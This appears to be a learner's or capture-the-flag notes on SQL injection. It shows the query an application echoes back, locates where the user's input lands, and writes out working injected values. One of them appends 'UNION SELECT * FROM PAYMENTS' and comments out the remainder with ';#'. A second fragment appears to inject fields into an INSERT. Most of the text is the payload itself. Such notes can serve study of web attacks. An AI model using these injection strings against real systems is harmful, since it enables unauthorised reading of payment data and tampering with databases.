Syntax returned when entering a value of 1000
SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 1000 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL

I need to look and see where the input is (shown below)
1000 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL

modify the query to include the needed syntax and the syntax i wanted to run, and comment out the unneeded output that youve shown will follow your input
1000 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL UNION SELECT * FROM PAYMENTS ;#


('', '', 'bob', 'bob', 'bob', 3)
bob','bob','bob',1) ;#
